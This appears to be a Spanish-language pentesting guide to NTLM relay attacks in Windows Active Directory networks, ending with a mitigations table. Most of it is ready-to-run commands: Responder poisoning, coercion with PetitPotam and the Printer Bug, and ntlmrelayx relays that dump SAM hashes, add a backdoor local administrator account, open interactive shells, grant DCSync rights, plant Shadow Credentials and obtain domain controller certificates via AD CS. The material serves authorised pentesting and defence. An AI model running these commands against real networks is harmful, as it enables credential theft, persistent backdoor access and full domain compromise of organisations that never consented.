# NTLM Relay

NTLM Relay es un ataque que intercepta una autenticación NTLM en tránsito y la retransmite a otro servicio antes de que expire, autenticándose como la víctima sin conocer su contraseña ni su hash. No es un ataque de cracking, es un ataque de retransmisión en tiempo real.

### Fundamento técnico

NTLM usa un esquema challenge-response de tres mensajes:

```
Cliente → NEGOTIATE_MESSAGE    → Servidor
Cliente ← CHALLENGE_MESSAGE    ← Servidor  (challenge de 8 bytes)
Cliente → AUTHENTICATE_MESSAGE → Servidor  (respuesta = hash(contraseña + challenge))
```

En el relay, el atacante se intercala en este flujo:

```
Víctima → NEGOTIATE  → Atacante → NEGOTIATE  → Objetivo
Víctima ← CHALLENGE  ← Atacante ← CHALLENGE  ← Objetivo
Víctima → AUTH       → Atacante → AUTH        → Objetivo → acceso concedido
```

El atacante nunca ve la contraseña — solo actúa de intermediario usando el challenge del objetivo real.

### Prerequisitos

Para que el relay funcione deben cumplirse simultáneamente:

* **SMB Signing desactivado** en el objetivo — si está activo, el servidor verifica que los mensajes están firmados y el relay falla. Es la protección más importante.
* **La víctima debe intentar autenticarse** contra el host atacante (por cualquier mecanismo: LLMNR, NBT-NS, o forzado activamente)
* **La cuenta víctima debe tener privilegios** en el objetivo (admin local, DA, etc.)
* El protocolo objetivo debe aceptar NTLM (SMB, HTTP, LDAP, MSSQL, etc.)

> No se puede hacer relay de una cuenta al mismo host desde donde se capturó la autenticación (protección loopback de Windows). La víctima debe ser distinta del objetivo.

### Fase 1 — Reconocimiento previo

#### Identificar hosts sin SMB Signing

```bash
# NetExec — escaneo de red completa
netexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Nmap — verificar manualmente
nmap -p 445 --script smb-security-mode 192.168.1.0/24

# La línea "message_signing: disabled" indica objetivo válido para relay
```

El archivo `relay_targets.txt` generado por NetExec contiene solo los hosts donde SMB signing está desactivado — son los objetivos válidos para el relay.

#### Verificar qué servicios escuchan

```bash
# Ver qué protocolos están disponibles en el objetivo
netexec smb 192.168.1.10 -u '' -p ''
nmap -sV -p 445,80,443,389,3389,5985 192.168.1.10
```

### Fase 2 — Captura de autenticaciones

Las víctimas intentan autenticarse contra el atacante por varios mecanismos. El más común en redes Windows es el envenenamiento de LLMNR/NBT-NS.

#### LLMNR/NBT-NS Poisoning con Responder

Cuando un host intenta resolver un nombre que no existe en DNS, difunde la consulta por LLMNR (puerto UDP 5355) y NBT-NS (UDP 137). Responder responde haciéndose pasar por el destino buscado, lo que provoca que la víctima intente autenticarse.

**Para usar Responder junto a ntlmrelayx, hay que desactivar SMB y HTTP en Responder** — de lo contrario Responder captura los hashes pero ntlmrelayx no puede escuchar en esos puertos:

```bash
# Editar /etc/responder/Responder.conf
SMB = Off
HTTP = Off

# Lanzar Responder solo para envenenamiento (sin capturar)
sudo responder -I eth0 -wdv
```

#### Alternativas para forzar autenticación

Si no se quiere esperar a que ocurra espontáneamente, se puede forzar:

```bash
# Printer Bug — fuerza autenticación de una cuenta de máquina
python3 printerbug.py DOMINIO/usuario:contraseña@192.168.1.10 IP_atacante

# PetitPotam — fuerza autenticación via MS-EFSRPC (no requiere credenciales en algunos entornos)
python3 PetitPotam.py IP_atacante 192.168.1.10

# coerce_http — fuerza autenticación HTTP
python3 coerce_http.py -u usuario -p contraseña -d DOMINIO 192.168.1.10 IP_atacante
```

### Fase 3 — Relay con ntlmrelayx

`impacket-ntlmrelayx` es el motor del ataque. Escucha las autenticaciones NTLM entrantes y las retransmite a los objetivos.

#### Modo básico — dump SAM automático

```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Por defecto, si la cuenta relay tiene admin local, vuelca SAM automáticamente
```

#### Ejecutar comando en el objetivo

```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support \
  -c "net user hacker Password123! /add && net localgroup administrators hacker /add"
```

#### Shell interactiva (smbexec)

```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i

# Una vez que llega un relay, ntlmrelayx abre un listener local:
# [*] Started interactive SMB client shell via TCP on 127.0.0.1:11000

# Conectar al shell interactivo
nc 127.0.0.1 11000
```

#### Relay a múltiples protocolos

```bash
# LDAP — útil cuando SMB signing está activo pero LDAP no
impacket-ntlmrelayx -t ldap://192.168.1.10 -smb2support

# LDAPS
impacket-ntlmrelayx -t ldaps://192.168.1.10 -smb2support

# HTTP/HTTPS (AD CS Web Enrollment — ESC8)
impacket-ntlmrelayx -t http://192.168.1.10/certsrv/certfnsh.asp \
  --adcs -smb2support --template KerberosAuthentication

# MSSQL
impacket-ntlmrelayx -t mssql://192.168.1.10 -smb2support

# WinRM
impacket-ntlmrelayx -t http://192.168.1.10:5985/wsman -smb2support
```

#### Relay a LDAP — opciones de escalada

Cuando se retransmite a LDAP con privilegios suficientes, se pueden ejecutar operaciones AD directamente:

```bash
# Delegar DCSync rights a una cuenta controlada
impacket-ntlmrelayx -t ldap://192.168.1.10 -smb2support --escalate-user usuario_controlado

# Dump de todos los hashes via LDAP (si la cuenta tiene permisos)
impacket-ntlmrelayx -t ldap://192.168.1.10 -smb2support --dump-laps --dump-adcs
```

### Escenario completo — SMB Relay en red AD

Este es el flujo estándar en un pentest interno:

```bash
# Terminal 1 — Responder (solo envenenamiento, SMB/HTTP off)
sudo responder -I eth0 -wdv

# Terminal 2 — ntlmrelayx apuntando a hosts sin SMB signing
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i

# Esperar a que un usuario intente resolver un nombre inexistente
# Responder envenena → usuario intenta auth → ntlmrelayx relay → acceso
```

Cuando el relay tiene éxito con una cuenta con privilegios:

```
[*] SMBD-Thread-5: Received connection from 192.168.1.50
[*] Authenticating against 192.168.1.20 as EMPRESA\jsmith SUCCEED
[*] Dumping SAM hashes...
Administrator:500:aad3b435...:31d6cfe0...
```

### Escenario — Relay a AD CS&#x20;

Si hay una CA con Web Enrollment sin HTTPS, el relay puede obtener certificados de cuentas de máquina de DC para luego hacer DCSync:

```bash
# Terminal 1 — Responder (SMB/HTTP off)
sudo responder -I eth0 -wdv

# Terminal 2 — relay al endpoint de AD CS
impacket-ntlmrelayx \
  -t http://192.168.1.50/certsrv/certfnsh.asp \
  --adcs \
  -smb2support \
  --template KerberosAuthentication

# Terminal 3 — forzar autenticación del DC (Printer Bug o PetitPotam)
python3 PetitPotam.py 192.168.1.1 192.168.1.10

# Resultado: certificado .pfx del DC → Pass-the-Certificate → DCSync
```

### Escenario — Relay a LDAP para Shadow Credentials

```bash
impacket-ntlmrelayx \
  -t ldaps://192.168.1.10 \
  -smb2support \
  --shadow-credentials \
  --shadow-target 'DC01$'
```

Añade una Shadow Credential al objeto indicado para autenticarse como esa cuenta via PKINIT.

### Relay desde Windows — Inveigh

En entornos donde solo se tiene acceso a un host Windows comprometido (sin SSH ni Linux), `Inveigh` replica las capacidades de Responder + relay en PowerShell/.NET:

```powershell
# Cargar Inveigh
Import-Module .\Inveigh.ps1

# Iniciar captura y relay
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# Inveigh-Relay — relay a objetivos
Import-Module .\InveighZero.ps1
Invoke-InveighRelay -ConsoleOutput Y -StatusOutput Y -Target 192.168.1.20 -Command "whoami"
```

### Tabla resumen de vectores

| Protocolo objetivo | Requisito                             | Resultado típico                             |
| ------------------ | ------------------------------------- | -------------------------------------------- |
| SMB                | Sin signing + admin local en objetivo | Dump SAM, ejecución de comandos, shell       |
| LDAP               | Permisos de escritura en AD           | DCSync rights, Shadow Credentials, LAPS dump |
| LDAPS              | Mismo que LDAP                        | Igual + operaciones con certificados         |
| HTTP (AD CS)       | CA con Web Enrollment HTTP            | Certificado → PtC → DCSync                   |
| MSSQL              | Credenciales con acceso a SQL         | Ejecución xp\_cmdshell si habilitado         |
| WinRM              | Admin en objetivo                     | Shell PowerShell remota                      |

### Mitigaciones

| Mitigación                                       | Efecto                                                           |
| ------------------------------------------------ | ---------------------------------------------------------------- |
| **SMB Signing obligatorio**                      | Bloquea relay SMB completamente — la contramedida más importante |
| **LDAP Signing + Channel Binding**               | Bloquea relay a LDAP/LDAPS                                       |
| **Deshabilitar LLMNR y NBT-NS**                  | Elimina el vector de captura pasiva más común                    |
| **EPA (Extended Protection for Authentication)** | Bloquea relay HTTP                                               |
| **Deshabilitar Web Enrollment sin HTTPS**        | Bloquea ESC8                                                     |
| **Protected Users group**                        | Fuerza Kerberos, deshabilita NTLM para los miembros              |
| **Deshabilitar NTLM globalmente**                | Elimina todos los vectores, puede romper compatibilidad legacy   |

> La configuración más impactante a recomendar en un informe es habilitar SMB Signing en toda la red — en Windows Server 2025 y Windows 11 está activo por defecto, pero entornos mixtos legacy suelen tenerlo desactivado por compatibilidad.
